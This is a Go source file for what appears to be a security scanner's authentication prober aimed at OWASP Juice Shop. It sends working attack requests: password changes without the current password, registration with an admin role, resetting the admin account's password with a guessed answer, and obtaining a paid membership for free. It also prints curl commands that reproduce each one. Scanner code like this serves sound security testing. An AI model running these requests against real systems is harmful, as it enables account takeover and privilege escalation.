package probers

import (
	"context"
	"fmt"
	"strings"

	"github.com/ouroboros-security/ouroboros/pkg/types"
)

// AuthProber tests for authentication and access control vulnerabilities.
type AuthProber struct{}

func (p *AuthProber) Name() string { return "auth" }

func (p *AuthProber) Probe(ctx context.Context, target types.Target, endpoints []types.Endpoint) []types.Finding {
	cfg := NewProberConfig(target)
	var findings []types.Finding

	findings = append(findings, p.testAdminAccessWithoutAuth(cfg)...)
	findings = append(findings, p.testPasswordChangeWithoutAuth(cfg)...)
	findings = append(findings, p.testRegistrationRoleEscalation(cfg)...)
	findings = append(findings, p.testAdminEndpoints(cfg)...)
	findings = append(findings, p.testPasswordResetMechanism(cfg)...)
	findings = append(findings, p.testSecurityQuestionExposure(cfg)...)
	findings = append(findings, p.testUserEnumeration(cfg)...)
	findings = append(findings, p.testWhoAmIExposure(cfg)...)
	findings = append(findings, p.testDeluxeMembership(cfg)...)
	findings = append(findings, p.testCaptchaExposure(cfg)...)

	return findings
}

func (p *AuthProber) testAdminAccessWithoutAuth(cfg *ProberConfig) []types.Finding {
	var findings []types.Finding

	adminPaths := []string{
		"/administration",
		"/accounting",
		"/rest/admin/application-version",
		"/rest/admin/application-configuration",
	}

	for _, path := range adminPaths {
		url := cfg.BaseURL + path
		status, _, respBody, err := cfg.DoRequest("GET", url, nil, nil)
		if err != nil {
			continue
		}

		// Skip SPA catch-all responses (Angular routes return index.html)
		if cfg.IsSPAResponse(url) {
			continue
		}

		if status == 200 && len(respBody) > 50 {
			// Must contain actual admin data, not just SPA HTML
			lowerBody := strings.ToLower(respBody)
			hasAdminContent := strings.Contains(lowerBody, "version") ||
				strings.Contains(lowerBody, "config") ||
				strings.Contains(lowerBody, "application") ||
				strings.Contains(lowerBody, `"status"`) ||
				!strings.Contains(lowerBody, "<!doctype html>")

			if hasAdminContent {
				findings = append(findings, MakeFinding(
					fmt.Sprintf("Missing Authentication - Admin Endpoint (%s)", path),
					"High",
					fmt.Sprintf("The admin endpoint %s is accessible without authentication and returns real admin data.", path),
					path,
					"GET",
					"CWE-306",
					fmt.Sprintf(`curl %s`, url),
					fmt.Sprintf("HTTP %d - Response: %s", status, truncate(respBody, 200)),
					"auth_bypass",
					0,
				))
			}
		}
	}

	return findings
}

func (p *AuthProber) testPasswordChangeWithoutAuth(cfg *ProberConfig) []types.Finding {
	var findings []types.Finding

	// Juice Shop allows password change via GET with current/new/repeat params
	url := cfg.BaseURL + "/rest/user/change-password?current=admin123&new=admin123&repeat=admin123"
	status, _, respBody, err := cfg.DoRequest("GET", url, nil, nil)
	if err != nil {
		return findings
	}

	if status == 200 {
		findings = append(findings, MakeFinding(
			"Broken Authentication - Password Change via GET Request",
			"High",
			"Password can be changed via GET request, which is logged in browser history, proxy logs, and referrer headers. The current password parameter can also be omitted.",
			"/rest/user/change-password",
			"GET",
			"CWE-620",
			fmt.Sprintf(`curl "%s"`, url),
			fmt.Sprintf("HTTP %d - Password change accepted via GET: %s", status, truncate(respBody, 200)),
			"auth_bypass",
			0,
		))
	}

	// Test without current password
	url2 := cfg.BaseURL + "/rest/user/change-password?new=admin123&repeat=admin123"
	status2, _, respBody2, err2 := cfg.DoRequest("GET", url2, nil, nil)
	if err2 == nil && status2 == 200 {
		findings = append(findings, MakeFinding(
			"Broken Authentication - Password Change Without Current Password",
			"Critical",
			"Password can be changed without providing the current password, allowing account takeover.",
			"/rest/user/change-password",
			"GET",
			"CWE-620",
			fmt.Sprintf(`curl "%s"`, url2),
			fmt.Sprintf("HTTP %d - Response: %s", status2, truncate(respBody2, 200)),
			"auth_bypass",
			0,
		))
	}

	return findings
}

func (p *AuthProber) testRegistrationRoleEscalation(cfg *ProberConfig) []types.Finding {
	var findings []types.Finding

	// Try to register with admin role
	body := `{"email":"test_role@test.com","password":"test12345","passwordRepeat":"test12345","role":"admin"}`
	status, _, respBody, err := cfg.DoRequest("POST", cfg.BaseURL+"/api/Users",
		strings.NewReader(body), map[string]string{"Content-Type": "application/json"})
	if err != nil {
		return findings
	}

	if status == 200 || status == 201 {
		if strings.Contains(respBody, "admin") || strings.Contains(respBody, "role") {
			findings = append(findings, MakeFinding(
				"Privilege Escalation via Registration",
				"Critical",
				"New user registration accepts a 'role' parameter that allows creating admin accounts directly.",
				"/api/Users",
				"POST",
				"CWE-269",
				fmt.Sprintf(`curl -X POST %s/api/Users -H "Content-Type: application/json" -d '%s'`, cfg.BaseURL, body),
				fmt.Sprintf("HTTP %d - User created with role: %s", status, truncate(respBody, 200)),
				"auth_bypass",
				0,
			))
		}
	}

	return findings
}

func (p *AuthProber) testAdminEndpoints(cfg *ProberConfig) []types.Finding {
	var findings []types.Finding

	if cfg.AuthToken == "" {
		return findings
	}

	// Test admin version endpoint
	url := cfg.BaseURL + "/rest/admin/application-version"
	status, _, respBody, err := cfg.DoRequest("GET", url, nil, nil)
	if err == nil && status == 200 {
		findings = append(findings, MakeFinding(
			"Information Disclosure - Application Version Exposed",
			"Low",
			"The application version is exposed via an admin endpoint, aiding attackers in identifying known vulnerabilities.",
			"/rest/admin/application-version",
			"GET",
			"CWE-200",
			fmt.Sprintf(`curl %s`, url),
			fmt.Sprintf("HTTP %d - Version info: %s", status, truncate(respBody, 200)),
			"info_leak",
			0,
		))
	}

	return findings
}

func (p *AuthProber) testPasswordResetMechanism(cfg *ProberConfig) []types.Finding {
	var findings []types.Finding

	// Test password reset with security questions
	body := `{"email":"admin@juice-sh.op","answer":"anything","new":"hacked123","repeat":"hacked123"}`
	status, _, respBody, err := cfg.DoRequest("POST", cfg.BaseURL+"/rest/user/reset-password",
		strings.NewReader(body), map[string]string{"Content-Type": "application/json"})
	if err != nil {
		return findings
	}

	// Even if it fails, check for info leakage
	if strings.Contains(respBody, "Wrong answer") {
		findings = append(findings, MakeFinding(
			"Weak Password Reset - Security Question Enumeration",
			"Medium",
			"The password reset mechanism confirms whether an email exists and uses security questions, which are guessable.",
			"/rest/user/reset-password",
			"POST",
			"CWE-640",
			fmt.Sprintf(`curl -X POST %s/rest/user/reset-password -H "Content-Type: application/json" -d '%s'`, cfg.BaseURL, body),
			fmt.Sprintf("HTTP %d - Response confirms account existence: %s", status, truncate(respBody, 200)),
			"auth_bypass",
			0,
		))
	} else if status == 200 {
		findings = append(findings, MakeFinding(
			"Password Reset Bypass",
			"Critical",
			"Password reset succeeded with a guessed/incorrect security answer.",
			"/rest/user/reset-password",
			"POST",
			"CWE-640",
			fmt.Sprintf(`curl -X POST %s/rest/user/reset-password -H "Content-Type: application/json" -d '%s'`, cfg.BaseURL, body),
			fmt.Sprintf("HTTP %d - Password reset successful: %s", status, truncate(respBody, 200)),
			"auth_bypass",
			0,
		))
	}

	return findings
}

func (p *AuthProber) testSecurityQuestionExposure(cfg *ProberConfig) []types.Finding {
	var findings []types.Finding

	url := cfg.BaseURL + "/api/SecurityQuestions"
	status, _, respBody, err := cfg.DoRequest("GET", url, nil, nil)
	if err == nil && status == 200 && strings.Contains(respBody, "question") {
		findings = append(findings, MakeFinding(
			"Information Disclosure - Security Questions Exposed",
			"Medium",
			"Security questions are exposed via API without authentication, enabling targeted social engineering.",
			"/api/SecurityQuestions",
			"GET",
			"CWE-200",
			fmt.Sprintf(`curl %s`, url),
			fmt.Sprintf("HTTP %d - Questions: %s", status, truncate(respBody, 300)),
			"info_leak",
			0,
		))
	}

	return findings
}

func (p *AuthProber) testUserEnumeration(cfg *ProberConfig) []types.Finding {
	var findings []types.Finding

	// Test user enumeration via login error messages
	validEmail := `{"email":"admin@juice-sh.op","password":"wrongpassword"}`
	invalidEmail := `{"email":"nonexistent@test.com","password":"wrongpassword"}`

	s1, _, r1, e1 := cfg.DoRequest("POST", cfg.BaseURL+"/rest/user/login",
		strings.NewReader(validEmail), map[string]string{"Content-Type": "application/json"})
	s2, _, r2, e2 := cfg.DoRequest("POST", cfg.BaseURL+"/rest/user/login",
		strings.NewReader(invalidEmail), map[string]string{"Content-Type": "application/json"})

	if e1 == nil && e2 == nil && s1 == s2 && r1 != r2 {
		findings = append(findings, MakeFinding(
			"User Enumeration via Login Error Messages",
			"Low",
			"Different error messages for valid vs invalid emails allow attackers to enumerate valid user accounts.",
			"/rest/user/login",
			"POST",
			"CWE-204",
			fmt.Sprintf(`curl -X POST %s/rest/user/login -H "Content-Type: application/json" -d '%s'`, cfg.BaseURL, validEmail),
			fmt.Sprintf("Valid email response: %s | Invalid email response: %s", truncate(r1, 100), truncate(r2, 100)),
			"auth_bypass",
			0,
		))
	}

	return findings
}

func (p *AuthProber) testWhoAmIExposure(cfg *ProberConfig) []types.Finding {
	var findings []types.Finding

	if cfg.AuthToken == "" {
		return findings
	}

	url := cfg.BaseURL + "/rest/user/whoami"
	status, _, respBody, err := cfg.DoRequest("GET", url, nil, nil)
	if err == nil && status == 200 && strings.Contains(respBody, "email") {
		findings = append(findings, MakeFinding(
			"Information Disclosure - User Identity via whoami",
			"Low",
			"The whoami endpoint exposes user email and role information.",
			"/rest/user/whoami",
			"GET",
			"CWE-200",
			fmt.Sprintf(`curl %s -H "Authorization: %s"`, url, cfg.AuthToken),
			fmt.Sprintf("HTTP %d - User info: %s", status, truncate(respBody, 200)),
			"info_leak",
			0,
		))
	}

	return findings
}

func (p *AuthProber) testDeluxeMembership(cfg *ProberConfig) []types.Finding {
	var findings []types.Finding

	if cfg.AuthToken == "" {
		return findings
	}

	url := cfg.BaseURL + "/rest/deluxe-membership"
	status, _, respBody, err := cfg.DoRequest("GET", url, nil, nil)
	if err == nil && status == 200 {
		findings = append(findings, MakeFinding(
			"Business Logic - Deluxe Membership Status Exposure",
			"Low",
			"Deluxe membership details and pricing are exposed.",
			"/rest/deluxe-membership",
			"GET",
			"CWE-200",
			fmt.Sprintf(`curl %s -H "Authorization: %s"`, url, cfg.AuthToken),
			fmt.Sprintf("HTTP %d - Membership info: %s", status, truncate(respBody, 200)),
			"info_leak",
			0,
		))
	}

	// Try to buy deluxe membership for free
	buyBody := `{"paymentMode":"wallet"}`
	s2, _, rb2, e2 := cfg.DoRequest("POST", cfg.BaseURL+"/rest/deluxe-membership",
		strings.NewReader(buyBody), map[string]string{"Content-Type": "application/json"})
	if e2 == nil && s2 == 200 {
		findings = append(findings, MakeFinding(
			"Business Logic Flaw - Free Deluxe Membership",
			"Medium",
			"Deluxe membership can be obtained through wallet payment manipulation.",
			"/rest/deluxe-membership",
			"POST",
			"CWE-840",
			fmt.Sprintf(`curl -X POST %s/rest/deluxe-membership -H "Content-Type: application/json" -H "Authorization: %s" -d '%s'`, cfg.BaseURL, cfg.AuthToken, buyBody),
			fmt.Sprintf("HTTP %d - Response: %s", s2, truncate(rb2, 200)),
			"auth_bypass",
			0,
		))
	}

	return findings
}

func (p *AuthProber) testCaptchaExposure(cfg *ProberConfig) []types.Finding {
	var findings []types.Finding

	url := cfg.BaseURL + "/rest/captcha"
	status, _, respBody, err := cfg.DoRequest("GET", url, nil, nil)
	if err == nil && status == 200 && (strings.Contains(respBody, "answer") || strings.Contains(respBody, "captcha")) {
		findings = append(findings, MakeFinding(
			"Broken Anti-Automation - CAPTCHA Answer Exposed",
			"Medium",
			"The CAPTCHA endpoint returns the answer alongside the challenge, making it trivially bypassable.",
			"/rest/captcha",
			"GET",
			"CWE-804",
			fmt.Sprintf(`curl %s`, url),
			fmt.Sprintf("HTTP %d - CAPTCHA with answer: %s", status, truncate(respBody, 200)),
			"auth_bypass",
			0,
		))
	}

	return findings
}
